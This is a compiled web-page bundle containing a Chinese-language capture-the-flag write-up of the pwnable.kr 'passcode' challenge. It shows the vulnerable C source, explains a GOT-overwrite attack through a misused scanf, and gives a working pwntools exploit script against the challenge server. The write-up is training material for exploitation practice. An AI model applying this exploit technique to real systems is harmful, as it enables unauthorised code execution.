(window.webpackJsonp=window.webpackJsonp||[]).push([[26],{467:function(s,t,n){"use strict";n.r(t);var a=n(14),e=Object(a.a)({},(function(){var s=this,t=s.$createElement,n=s._self._c||t;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("hr"),s._v(" "),n("blockquote",[n("p",[s._v("åˆ·pwnableã€‚ã€‚ã€‚")])]),s._v(" "),n("h2",{attrs:{id:"é¢˜ç›®-passcode-10-pt"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#é¢˜ç›®-passcode-10-pt"}},[s._v("#")]),s._v(" é¢˜ç›®:passcode - 10 pt")]),s._v(" "),n("p",[s._v("Mommy told me to make a passcode based login system.\nMy initial C code was compiled without any error!\nWell, there was some compiler warning, but who cares about that?")]),s._v(" "),n("p",[s._v("å¦ˆå¦ˆå‘Šè¯‰æˆ‘å»åšä¸€ä¸ªå¯†ç åŸºäºæœ¬åœ°ç³»ç»Ÿï¼Œ\næˆ‘çš„åˆå§‹åŒ–cä»£ç å·²ç»ç¼–ç¨‹æˆåŠŸäº†ï¼Œæ²¡æœ‰ä»»ä½•é”™è¯¯ï¼Œ\nä½†æ˜¯ï¼Œè¿™æœ‰ä¸€ä¸‹ç¼–è¯‘çš„è­¦å‘Šï¼Œä½†æ˜¯è°åœ¨æ„å‘¢ï¼Ÿ-_-")]),s._v(" "),n("p",[s._v("ssh passcode@pwnable.kr -p2222 (pw:guest)")]),s._v(" "),n("h2",{attrs:{id:"writeup"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#writeup"}},[s._v("#")]),s._v(" writeup")]),s._v(" "),n("p",[s._v("é¦–å…ˆè¿˜æ˜¯è¿œç¨‹è¿æ¥äº†ï¼Œè¿æ¥ä¸Šå»çœ‹çœ‹æœ‰ä»€ä¹ˆã€‚\nä¸‰ä¸ªæ–‡ä»¶ã€‚")]),s._v(" "),n("div",{staticClass:"language-sh line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-sh"}},[n("code",[s._v("passcode@ubuntu:~$ "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("ls")]),s._v("\nflag  passcode  passcode.c\npasscode@ubuntu:~$ ./passcode\nToddler"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("'s Secure Login System "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.0")]),s._v(" beta.\nenter you name "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" chen\nWelcome chen"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("\nenter passcode1 "),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\nSegmentation fault\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br")])]),n("p",[s._v("æƒŠäº†,è¿˜æ²¡æ€ä¹ˆè¿è¡Œå°±æŠ¥é”™äº†ï¼Œç›´æ¥çœ‹æºä»£ç ã€‚")]),s._v(" "),n("div",{staticClass:"language-C line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-c"}},[n("code",[s._v("\n"),n("span",{pre:!0,attrs:{class:"token macro property"}},[s._v("#"),n("span",{pre:!0,attrs:{class:"token directive keyword"}},[s._v("include")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("<stdio.h>")])]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token macro property"}},[s._v("#"),n("span",{pre:!0,attrs:{class:"token directive keyword"}},[s._v("include")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("<stdlib.h>")])]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("void")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("login")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("int")]),s._v(" passcode1"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("int")]),s._v(" passcode2"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"enter passcode1 : "')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("scanf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%d"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" passcode1"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("fflush")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token constant"}},[s._v("stdin")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// ha! mommy told me that 32bit is vulnerable to bruteforcing :)")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"enter passcode2 : "')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("scanf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%d"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" passcode2"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"checking...\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("passcode1"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("338150")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" passcode2"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("13371337")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Login OK!\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/bin/cat flag"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("else")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Login Failed!\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n            "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("exit")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("void")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("welcome")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("char")]),s._v(" name"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("100")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"enter you name : "')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("scanf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%100s"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" name"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Welcome %s!\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" name"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("int")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("main")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Toddler\'s Secure Login System 1.0 beta.\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("welcome")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("login")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n    "),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("// something after login...")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Now I can safely trust you that you have credential :)\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br")])]),n("ol",[n("li",[s._v("é¦–å…ˆçœ‹main()ï¼Œè¾“å‡ºä¹‹åè°ƒç”¨welcomeå‡½æ•°ï¼Œå†è°ƒç”¨loginå‡½æ•°ï¼Œä¹‹åæ‰“å°æ­£ç¡®å§ã€‚")]),s._v(" "),n("li",[s._v("çœ‹welcome()ï¼Œè¾“å…¥nameã€‚æ²¡ä»€ä¹ˆä¸œè¥¿ã€‚")]),s._v(" "),n("li",[s._v("fflush(stdin)æ˜¯ä¸€ä¸ªè®¡ç®—æœºä¸“ä¸šæœ¯è¯­ï¼ŒåŠŸèƒ½æ˜¯æ¸…ç©ºè¾“å…¥ç¼“å†²åŒºï¼Œé€šå¸¸æ˜¯ä¸ºäº†ç¡®ä¿ä¸å½±å“åé¢çš„æ•°æ®è¯»å–ï¼ˆä¾‹å¦‚åœ¨è¯»å®Œä¸€ä¸ªå­—ç¬¦ä¸²åç´§æ¥ç€åˆè¦è¯»å–ä¸€ä¸ªå­—ç¬¦ï¼Œæ­¤æ—¶åº”è¯¥å…ˆæ‰§è¡Œfflush(stdin);ï¼‰ã€‚")]),s._v(" "),n("li",[s._v("login()å‡½æ•°ä¸­ï¼Œå…ˆåè°ƒç”¨scanf()è·å–ç”¨æˆ·è¾“å…¥çš„ä¸¤ä¸ªpasscodeç„¶ååˆ†åˆ«ä¸338150å’Œ13371337ä½œæ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰çš„è¯ï¼Œä¾¿ä¼šæ‰“å°flagã€‚è¿™ç¨‹åºè®¾è®¡çš„é€»è¾‘ä¼¼ä¹æ²¡å•¥é—®é¢˜ï¼Œä½†æ˜¯ä»”ç»†ä¸€çœ‹ï¼Œå‘ç°è¿™é‡Œï¼š")])]),s._v(" "),n("div",{staticClass:"language-c line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-c"}},[n("code",[n("span",{pre:!0,attrs:{class:"token function"}},[s._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"enter passcode1 : "')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("scanf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%d"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" passcode1"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br")])]),n("p",[s._v('æ²¡æœ‰åŠ å–åœ°å€ç¬¦å·&ï¼Œç¨‹åºä¼šé»˜è®¤ä»æ ˆä¸­è¯»å–4ä¸ªå­—èŠ‚çš„æ•°æ®å½“åšscanfå–çš„åœ°å€ã€‚æ¼æ´å°±å‘ç”Ÿåœ¨è¿™é‡Œï¼Œå¯ä»¥åˆ©ç”¨GOTè¦†å†™æŠ€æœ¯æ”»å‡»è¿™ä¸ªç¨‹åºã€‚è¿™ä¸ªçš„æ„æ€å°±æ˜¯passcode1ä½¿ç”¨å€¼ä¼ é€’ï¼ŒåŸæ¥æ ˆä¸­é—´æ˜¯ä»€ä¹ˆå€¼å°±å–è¿™ä¸ªå€¼ï¼Œä½†æ˜¯scanfä¼šä»¥ä¸ºæ˜¯åœ°å€ï¼Œæ‰€ä»¥ä¼šå‘ä¸€ä¸ªæœªçŸ¥åœ°å€å†™å€¼ã€‚è™½ç„¶å†™å…¥çš„å€¼è¿˜æ˜¯å¯¹çš„ï¼Œä½†æ˜¯åœ°å€æœªçŸ¥ã€‚æ„æ€å°±æ˜¯æˆ‘ä»¬å¯ä»¥æ“æ§passcode1åˆ°ä»»æ„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´scanfæ˜¯å‘æŸä¸ªåœ°å€å†™æ•°æ®ã€‚å¦‚æœæˆ‘ä»¬è·å¾—äº†fflush@plt()çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥å‘gotè¡¨ä¸­å†™å…¥æŒ‡ä»¤ã€‚\n5. å°†ä¸€ä¸ªGOTè¡¨ä¸­çš„å‡½æ•°åœ°å€å†™åˆ°æ ˆä¸­ï¼Œç”¨æ¥å……å½“scanfï¼ˆï¼‰å–çš„åœ°å€ï¼Œç„¶åæŠŠsystem("/bin/cat flag")è¿™æ¡æŒ‡ä»¤çš„åœ°å€å†™åˆ°è¿™ä¸ªGOTè¡¨ä¸­çš„å‡½æ•°ã€‚å½“è¿™ä¸ªå‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œå°±ä¼šç›´æ¥æ‰§è¡Œsystem("/bin/cat flag")\n6. ç°åœ¨æŸ¥çœ‹ä¸€ä¸‹GOTè¡¨ä¸­fflush()çš„ä½ç½®ï¼Œå¾ˆå¤šæ–¹æ³•å¯ä»¥æŸ¥çœ‹elfæ–‡ä»¶çš„GOTè¡¨ï¼Œè¿™é‡Œè¯´ä¸¤ä¸ªå¸¸ç”¨çš„å‘½ä»¤ï¼š\nreadelf -r elf\nobjdump -R elf\n7. æ€»ç»“ï¼Œè¿™ä¸ªæ¼æ´å°±æ˜¯å…ˆæ”¹scanfæŒ‡å‘çš„åœ°å€ï¼Œä½¿å…¶æŒ‡å‘gotè¡¨ï¼Œç„¶åè¾“å…¥çš„å°±æ˜¯æ‰§è¡Œå‡½æ•°çš„åœ°å€ã€‚')]),s._v(" "),n("p",[s._v('å¯ä»¥æ‰¾åˆ°system("/bin/cat flag")å¯¹åº”æ±‡ç¼–ä»£ç å¼€å§‹äº0x80485e3ï¼ˆè¿™é‡Œæœ‰ä¸¤æ¡æŒ‡ä»¤ï¼Œç¬¬ä¸€æ¡å°†å‚æ•°"/bin/cat flag"å…¥æ ˆï¼Œç¬¬äºŒæ¡è°ƒç”¨system()ï¼‰ä¹Ÿå°±æ˜¯è¯´è¦æŠŠ0x80485e3è¿™ä¸ªå€¼å†™å…¥fflush()ä¸­ã€‚')]),s._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#!/usr/bin/python")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n\nname_addr"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xffffd078")]),s._v("\npass1_addr"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xffffd0d8")]),s._v("\nfflush_got "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0804a004")]),s._v("\nsystem_addr "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x80485e3")]),s._v("\n\npwn_ssh"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("ssh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("host"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'pwnable.kr'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("user"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'passcode'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("password"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'guest'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("port"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("2222")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),s._v(" pwn_ssh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("connected"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nsh"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pwn_ssh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("process"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("executable"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"./passcode"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),s._v(" sh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nshellcode "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'A'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("pass1_addr"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("name_addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\npayload "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" shellcode "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("fflush_got"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("str")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("system_addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nsh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),s._v(" sh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recvall"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n